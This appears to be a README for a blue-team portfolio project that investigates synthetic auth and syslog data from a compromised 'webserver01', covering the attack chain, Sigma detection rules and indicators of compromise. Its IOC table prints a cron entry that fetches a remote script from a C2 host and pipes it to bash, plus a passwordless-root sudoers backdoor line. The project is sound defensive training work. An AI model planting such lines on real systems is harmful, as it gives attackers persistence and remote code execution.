# Security Monitoring & Incident Response — webserver01

A blue-team log investigation: correlating raw `auth.log` / `syslog.log` data into a full attack
timeline, SIEM-style detection rules, severity-rated incident classification, and an incident
response workflow from detection through closure.

**[Full Report (PDF)](./report/Security_Monitoring_Incident_Response_Report.pdf)**

---

## Summary

Log analysis of `webserver01` uncovered a successful SSH brute-force compromise that escalated
into full root takeover, backdoor account persistence, command-and-control beaconing, and
anti-forensic log tampering — all traced to a single external IP over a ~3-hour window, with the
planted backdoor confirmed re-used roughly 2.3 hours after it was created.

| | |
|---|---|
| **Host** | webserver01 |
| **Log sources** | `auth.log` (260 lines), `syslog.log` (111 lines) |
| **Analysis window** | Mar 09 06:10 – Mar 11 04:22 |
| **Attacker IP** | 198.51.100.23 |
| **C2 host** | 192.0.2.99 |
| **Overall severity** | High |

## Attack chain

1. **SSH brute force** — 46 failed login attempts (38 username-enumeration + 8 targeted) against
   a single host in under 30 minutes
2. **Credential compromise** — password guessed for a low-privilege `backup` service account
3. **Privilege escalation** — `sudo` abused to obtain an interactive root shell within a minute of login
4. **Backdoor persistence** — new `sysupdate` account created with passwordless (`NOPASSWD:ALL`) root sudo
5. **C2 beaconing** — cron job installed, downloading and executing a remote payload every 10 minutes
6. **Anti-forensics** — shell history wiped to hinder investigation
7. **Data staging** — web root and nginx config archived to a hidden path, with a matching outbound transfer to the C2 host
8. **Confirmed re-exploitation** — backdoor account logged in and used again ~2.3 hours after creation

## Indicators of Compromise

Full structured list with types and timestamps: [`iocs/iocs.csv`](./iocs/iocs.csv)

| Indicator | Type | Category | Note |
|---|---|---|---|
| `198.51.100.23` | IPv4 | Network | Brute-force origin; backdoor login; repeat probing |
| `192.0.2.99` | IPv4 | Network | C2 downloader target; likely exfil destination |
| `sysupdate` | Username | Account | Backdoor, passwordless root sudo (UID 1002) |
| `backup` | Username | Account | Compromised entry-point account (UID 1001) |
| `*/10 * * * * curl -s http://192.0.2.99/update.sh \| bash` | Cron entry | Persistence | Malware downloader / C2 beacon |
| `sysupdate ALL=(ALL) NOPASSWD:ALL` | Sudoers entry | Persistence | Appended line granting passwordless root |
| `/tmp/.cache_bkp.tar.gz` | File path | Host | Hidden archive of web root + nginx config |
| `.bash_history` | File path | Host | Truncated — anti-forensic evidence destruction |

## Detection Rules

Written as real [Sigma](https://github.com/SigmaHQ/sigma) rules — the industry-standard, portable
format for SIEM detection logic (Splunk, Elastic, Microsoft Sentinel, and others can all consume
Sigma rules via backend converters). Each rule maps to a real [MITRE ATT&CK](https://attack.mitre.org/)
technique and references the specific event in the investigation it was built from.

Full rule files: [`detections/`](./detections/)

| Rule | Severity | ATT&CK Technique | Detects |
|---|---|---|---|
| [`rule-01`](./detections/rule-01-ssh-bruteforce.yml) | Medium | T1110 / T1110.001 | SSH brute force / username enumeration |
| [`rule-02`](./detections/rule-02-login-unrecognised-source.yml) | High | T1078 | Login from an unrecognised source IP |
| [`rule-03`](./detections/rule-03-repeated-access-after-block.yml) | Medium | T1110.001 | Automated reconnect after a forced disconnect |
| [`rule-04`](./detections/rule-04-escalation-unusual-hours.yml) | High | T1548.003 | Root escalation outside business hours |
| [`rule-05`](./detections/rule-05-new-privileged-account.yml) | High | T1136 / T1136.001 | New privileged (sudo-enabled) account |
| [`rule-06`](./detections/rule-06-sudoers-modification.yml) | High | T1548.003 | Sudoers file modification (esp. NOPASSWD) |
| [`rule-07`](./detections/rule-07-cron-c2-beaconing.yml) | High | T1053.003 / T1105 | Cron job piping a download into a shell (C2) |
| [`rule-08`](./detections/rule-08-anti-forensic-activity.yml) | High | T1070.003 | Shell history cleared (anti-forensics) |

## What's in the report

- **Log Analysis** — full event-by-event timeline, each event benchmarked against a verified
  baseline of normal administrative activity
- **Detection Logic** — the same 8 rules above, written in the report as readable `WHEN` / `THEN`
  logic with the reasoning for why each one should fire
- **Incident Classification & Response** — every event rated Low / Medium / High with impact and
  recommended response action
- **Incident Workflow** — the full Detection → Alert → Investigation → Response → Recovery →
  Closure lifecycle applied to this specific case
- **Indicators of Compromise** — network, account, persistence, and host/file IOCs
- **Security Recommendations** — preventive controls mapped back to the specific gaps this
  incident exposed

## Skills demonstrated

`Log correlation` · `SSH/auth log analysis` · `Sigma detection-rule authoring` · `MITRE ATT&CK mapping` ·
`Incident triage & severity classification` · `Incident response lifecycle` · `IOC extraction` · `Technical report writing`

## Repo structure

```
.
├── report/
│   └── Security_Monitoring_Incident_Response_Report.pdf   # full report
├── detections/
│   ├── rule-01-ssh-bruteforce.yml                          # Sigma detection rules
│   ├── rule-02-login-unrecognised-source.yml
│   ├── rule-03-repeated-access-after-block.yml
│   ├── rule-04-escalation-unusual-hours.yml
│   ├── rule-05-new-privileged-account.yml
│   ├── rule-06-sudoers-modification.yml
│   ├── rule-07-cron-c2-beaconing.yml
│   └── rule-08-anti-forensic-activity.yml
├── iocs/
│   └── iocs.csv                                            # structured indicator list
└── logs/
    ├── auth.log       # raw SSH/auth log (source data)
    └── syslog.log      # raw system log (source data)
```

The logs are synthetic data used for training purposes; all IPs are drawn from
documentation-reserved ranges (RFC 5737 `TEST-NET` blocks) and do not correspond to real hosts.
